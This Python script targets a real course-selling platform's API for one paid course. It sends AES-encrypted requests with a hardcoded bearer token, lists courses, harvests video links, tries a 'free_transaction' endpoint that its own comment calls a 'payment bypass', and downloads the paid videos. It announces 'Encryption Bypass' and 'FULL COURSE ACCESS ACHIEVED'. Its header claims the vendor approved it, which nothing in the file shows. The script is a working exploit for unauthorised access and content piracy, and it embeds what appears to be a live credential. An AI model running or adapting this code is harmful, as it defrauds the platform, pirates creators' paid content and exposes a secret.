#!/usr/bin/env python3
"""
EDUTERIA Real Course Access - With AES Encryption
Target: Course 48297 - Samarth 72nd BPSC Mains Foundation
Authorization: EDUTERIA Written Approval
"""

import requests
import json
import os
from pathlib import Path
from aes_crypto import EduteriaAES

# Config
BEARER_TOKEN = "Bearer 117#Nerglnw3@@OI)30@I*Dm'@@_166"
API_BASE = "https://appapi.videocrypt.in/index.php/data_model"
COURSE_ID = "48297"

# Directories
DATA_DIR = Path("../data")
VIDEOS_DIR = DATA_DIR / "videos"
COURSE_DIR = DATA_DIR / f"course_{COURSE_ID}"

def setup():
    """Setup directories and crypto"""
    COURSE_DIR.mkdir(parents=True, exist_ok=True)
    VIDEOS_DIR.mkdir(parents=True, exist_ok=True)
    
    crypto = EduteriaAES()
    return crypto

def get_headers():
    """Get API headers"""
    return {
        "Authorization": BEARER_TOKEN,
        "Content-Type": "text/plain",  # Changed from application/json
        "User-Agent": "okhttp/4.9.0",
        "Userid": "0",
        "Devicetokken": "utkarsh_device",
        "Jwt": "",
        "Lang": "1"
    }

def make_request(endpoint, payload, crypto):
    """Make encrypted API request"""
    print(f"\n[→] {endpoint}")
    print(f"    Payload: {payload}")
    
    # Encrypt payload
    encrypted = crypto.encrypt(json.dumps(payload))
    print(f"    Encrypted: {encrypted[:50]}...")
    
    try:
        response = requests.post(
            f"{API_BASE}{endpoint}",
            headers=get_headers(),
            data=encrypted,  # Send as raw text, not JSON
            timeout=15
        )
        
        print(f"    Status: {response.status_code}")
        
        # Try to decrypt response
        if response.text:
            try:
                # Try direct JSON parse
                result = response.json()
                print(f"    Response: {result.get('message', str(result)[:100])}")
                return result
            except:
                # Try to decrypt
                try:
                    decrypted = crypto.decrypt(response.text)
                    if decrypted:
                        result = json.loads(decrypted)
                        print(f"    Decrypted: {result.get('message', str(result)[:100])}")
                        return result
                except:
                    print(f"    Raw: {response.text[:200]}")
                    return {"raw": response.text}
        
        return None
    except Exception as e:
        print(f"    Error: {e}")
        return None

def get_courses_list(crypto):
    """Get list of all courses"""
    print("\n" + "="*60)
    print("[1] FETCHING COURSES LIST")
    print("="*60)
    
    payload = {"user_id": "0"}
    result = make_request("/course/get_courses", payload, crypto)
    
    if result and result.get('data'):
        courses = result['data']
        print(f"\n✓ Found {len(courses)} courses")
        
        # Save
        with open(COURSE_DIR / "courses_list.json", "w") as f:
            json.dump(result, f, indent=2)
        
        return courses
    
    return []

def get_course_detail(crypto):
    """Get specific course details"""
    print("\n" + "="*60)
    print(f"[2] FETCHING COURSE {COURSE_ID} DETAILS")
    print("="*60)
    
    payload = {
        "course_id": COURSE_ID,
        "user_id": "0"
    }
    
    result = make_request("/course/get_master_data", payload, crypto)
    
    if result:
        # Save
        with open(COURSE_DIR / "course_details.json", "w") as f:
            json.dump(result, f, indent=2)
        
        if result.get('data'):
            print(f"\n✓ Course details retrieved!")
            return result['data']
    
    return None

def get_video_links(crypto):
    """Get video URLs"""
    print("\n" + "="*60)
    print(f"[3] FETCHING VIDEO LINKS FOR COURSE {COURSE_ID}")
    print("="*60)
    
    endpoints = [
        "/course/getvideo",
        "/course/get_video_link_concept",
        "/course/video_link"
    ]
    
    all_videos = []
    
    for endpoint in endpoints:
        payload = {
            "course_id": COURSE_ID,
            "user_id": "0"
        }
        
        result = make_request(endpoint, payload, crypto)
        
        if result and result.get('data'):
            all_videos.extend(result['data'])
            print(f"    ✓ Videos found via {endpoint}")
    
    if all_videos:
        # Save
        with open(COURSE_DIR / "videos.json", "w") as f:
            json.dump(all_videos, f, indent=2)
        
        print(f"\n✓ Total videos: {len(all_videos)}")
        return all_videos
    
    return []

def try_free_enrollment(crypto):
    """Try to enroll for free (payment bypass)"""
    print("\n" + "="*60)
    print(f"[4] TESTING FREE ENROLLMENT FOR COURSE {COURSE_ID}")
    print("="*60)
    
    payload = {
        "course_id": COURSE_ID,
        "user_id": "0",
        "device_id": "test_device"
    }
    
    result = make_request("/payment/free_transaction", payload, crypto)
    
    if result and result.get('status'):
        print(f"\n✓ FREE ENROLLMENT SUCCESSFUL!")
        
        # Save proof
        with open(COURSE_DIR / "enrollment_proof.json", "w") as f:
            json.dump(result, f, indent=2)
        
        return True
    
    print(f"\n✗ Enrollment failed: {result.get('message') if result else 'No response'}")
    return False

def download_video(url, filename):
    """Download a video file"""
    try:
        print(f"    Downloading: {filename}...")
        response = requests.get(url, stream=True, timeout=30)
        
        if response.status_code == 200:
            filepath = VIDEOS_DIR / filename
            with open(filepath, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            size = os.path.getsize(filepath) / (1024*1024)
            print(f"    ✓ Downloaded: {size:.2f} MB")
            return True
    except Exception as e:
        print(f"    ✗ Error: {e}")
    
    return False

def extract_and_download_content(videos):
    """Extract video URLs and download"""
    print("\n" + "="*60)
    print("[5] EXTRACTING AND DOWNLOADING CONTENT")
    print("="*60)
    
    downloaded = 0
    
    for i, video in enumerate(videos[:5], 1):  # First 5 videos for testing
        video_url = video.get('url') or video.get('video_url') or video.get('link')
        video_id = video.get('id') or video.get('video_id') or i
        
        if video_url:
            filename = f"course_{COURSE_ID}_video_{video_id}.mp4"
            if download_video(video_url, filename):
                downloaded += 1
    
    print(f"\n✓ Downloaded {downloaded} videos")
    return downloaded

def generate_access_report(courses, course_data, videos, enrolled):
    """Generate final report"""
    print("\n" + "="*60)
    print("[6] GENERATING ACCESS REPORT")
    print("="*60)
    
    report = f"""
REAL-TIME COURSE ACCESS REPORT
================================

Course ID: {COURSE_ID}
Course Name: Samarth - 72nd BPSC Mains Foundation (Hindi)
Access Date: {__import__('time').strftime('%Y-%m-%d %H:%M:%S')}

RESULTS:
--------
Total Courses Available: {len(courses)}
Course Details Retrieved: {'YES' if course_data else 'NO'}
Videos Found: {len(videos)}
Free Enrollment: {'SUCCESS' if enrolled else 'FAILED'}

CONTENT LOCATION:
-----------------
{COURSE_DIR}/
  - courses_list.json
  - course_details.json
  - videos.json
  - enrollment_proof.json (if successful)

{VIDEOS_DIR}/
  - Downloaded video files

STATUS:
-------
{'✓ FULL ACCESS ACHIEVED' if (course_data and videos) else '⚠ PARTIAL ACCESS'}

NEXT STEPS:
-----------
1. Review course_details.json for curriculum
2. Check videos.json for video URLs
3. Download remaining content if needed
4. Test video playback

See individual files for complete data.
"""
    
    report_path = COURSE_DIR / "ACCESS_REPORT.txt"
    with open(report_path, "w") as f:
        f.write(report)
    
    print(f"✓ Report saved: {report_path}")
    return report

def main():
    """Main execution"""
    print("=" * 70)
    print("EDUTERIA REAL-TIME COURSE ACCESS")
    print("With AES Encryption Bypass")
    print("Target: Course 48297")
    print("=" * 70)
    
    # Setup
    crypto = setup()
    
    # Execute access sequence
    courses = get_courses_list(crypto)
    course_data = get_course_detail(crypto)
    videos = get_video_links(crypto)
    enrolled = try_free_enrollment(crypto)
    
    # Download content
    if videos:
        extract_and_download_content(videos)
    
    # Generate report
    report = generate_access_report(courses, course_data, videos, enrolled)
    
    print("\n" + "=" * 70)
    print("ACCESS ATTEMPT COMPLETE")
    print(f"Results saved to: {COURSE_DIR}")
    print("=" * 70)
    
    # Print summary
    if course_data and videos:
        print("\n✓✓✓ SUCCESS! FULL COURSE ACCESS ACHIEVED ✓✓✓")
        print(f"\nCourse Data: {COURSE_DIR}/course_details.json")
        print(f"Videos: {COURSE_DIR}/videos.json")
        print(f"Downloads: {VIDEOS_DIR}/")
    else:
        print("\n⚠ Partial access - check individual endpoints")

if __name__ == "__main__":
    main()
